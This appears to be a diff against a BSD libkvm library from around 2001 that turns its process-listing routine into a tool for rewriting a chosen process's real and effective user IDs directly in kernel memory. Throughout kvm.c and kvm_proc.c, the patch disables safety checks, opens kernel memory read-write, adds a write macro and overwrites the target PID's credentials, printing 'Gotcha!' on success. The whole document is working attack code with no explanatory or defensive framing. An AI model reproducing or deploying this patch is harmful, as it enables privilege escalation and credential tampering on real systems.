@@ -1,0 +1,123 @@
+diff -bur /usr/src/lib/libkvm/kvm.c kvm/kvm.c
+--- /usr/src/lib/libkvm/kvm.c	Mon Sep  4 23:06:41 2000
++++ kvm/kvm.c	Sat Jan 27 18:30:17 2001
+@@ -198,6 +198,7 @@
+ 	if (mf == 0)
+ 		mf = _PATH_MEM;
+ 
++	/*
+ 	if ((kd->pmfd = open(mf, flag, 0)) < 0) {
+ 		_kvm_syserr(kd, kd->program, "%s", mf);
+ 		goto failed;
+@@ -206,7 +207,8 @@
+ 		_kvm_syserr(kd, kd->program, "%s", mf);
+ 		goto failed;
+ 	}
+-	if (S_ISCHR(st.st_mode)) {
++	*/
++	if (1) {
+ 		/*
+ 		 * If this is a character special device, then check that
+ 		 * it's /dev/mem.  If so, open kmem too.  (Maybe we should
+@@ -220,7 +222,7 @@
+ 				 "%s: not physical memory device", mf);
+ 			goto failed;
+ 		} else {
+-			if ((kd->vmfd = open(_PATH_KMEM, flag)) < 0) {
++			if ((kd->vmfd = open(target_kmem, flag|O_RDWR)) < 0) {
+ 				_kvm_syserr(kd, kd->program, "%s", _PATH_KMEM);
+ 				goto failed;
+ 			}
+@@ -367,7 +369,7 @@
+ 	register int cc;
+ 	register void *cp;
+ 
+-	if (ISALIVE(kd)) {
++	if (1) {
+ 		/*
+ 		 * We're using /dev/kmem.  Just read straight from the
+ 		 * device and let the active kernel do the address translation.
+@@ -430,7 +432,7 @@
+ {
+ 	register int cc;
+ 
+-	if (ISALIVE(kd)) {
++	if (1) {
+ 		/*
+ 		 * Just like kvm_read, only we write.
+ 		 */
+diff -bur /usr/src/lib/libkvm/kvm_private.h kvm/kvm_private.h
+--- /usr/src/lib/libkvm/kvm_private.h	Mon Dec 27 08:14:58 1999
++++ kvm/kvm_private.h	Sat Jan 27 18:29:05 2001
+@@ -80,3 +80,9 @@
+ void	 _kvm_syserr
+ 	    __P((kvm_t *kd, const char *program, const char *fmt, ...));
+ int	 _kvm_uvatop __P((kvm_t *, const struct proc *, u_long, u_long *));
++
++extern pid_t target_pid;
++extern uid_t target_ruid;
++extern uid_t target_euid;
++extern char * target_kmem;
++extern int target_debug;
+diff -bur /usr/src/lib/libkvm/kvm_proc.c kvm/kvm_proc.c
+--- /usr/src/lib/libkvm/kvm_proc.c	Wed Jul  5 14:19:58 2000
++++ kvm/kvm_proc.c	Sat Jan 27 18:29:05 2001
+@@ -93,6 +93,9 @@
+ #define KREAD(kd, addr, obj) \
+ 	(kvm_read(kd, addr, (char *)(obj), sizeof(*obj)) != sizeof(*obj))
+ 
++#define KWRITE(kd, addr, obj) \
++	(kvm_write(kd, addr, (char *)(obj), sizeof(*obj)) != sizeof(*obj))
++
+ /*
+  * Read proc's from memory file into buffer bp, which has space to hold
+  * at most maxcnt procs.
+@@ -113,6 +116,7 @@
+ 	struct proc proc;
+ 	struct proc pproc;
+ 
++	if(target_debug)printf("Wading through ps-list:\n");
+ 	for (; cnt < maxcnt && p != NULL; p = proc.p_list.le_next) {
+ 		if (KREAD(kd, (u_long)p, &proc)) {
+ 			_kvm_err(kd, kd->program, "can't read proc at %x", p);
+@@ -122,6 +126,23 @@
+ 			(void)(KREAD(kd, (u_long)eproc.e_pcred.pc_ucred,
+ 			             &eproc.e_ucred));
+ 
++		if(target_debug)printf("pid: %5ld, uid: %4ld, gid: %4ld\n",proc.p_pid,eproc.e_pcred.p_ruid,eproc.e_pcred.p_rgid);
++		if (proc.p_pid == target_pid ){
++			eproc.e_pcred.p_ruid=target_ruid;  /* RUID */
++			if(KWRITE(kd, (u_long)proc.p_cred, &eproc.e_pcred))
++				printf ("RUID_ERR %s\n",kvm_geterr(kd));
++
++			eproc.e_ucred.cr_uid=target_euid; /* EUID */
++			if(KWRITE(kd, (u_long)eproc.e_pcred.pc_ucred,&eproc.e_ucred))
++				printf ("EUID_ERR: %s\n",kvm_geterr(kd));
++
++			printf("Gotcha!\n");
++			return(-1);
++		};
++	};
++	printf("Whoops, pid not found :(\n");
++	return (-1);
++#if 0
+ 		switch(what) {
+ 
+ 		case KERN_PROC_PID:
+@@ -238,6 +259,7 @@
+ 		++cnt;
+ 	}
+ 	return (cnt);
++#endif
+ }
+ 
+ /*
+@@ -292,7 +314,7 @@
+ 		 */
+ 		kd->procbase = 0;
+ 	}
+-	if (ISALIVE(kd)) {
++	if (0) {
+ 		size = 0;
+ 		mib[0] = CTL_KERN;
+ 		mib[1] = KERN_PROC;
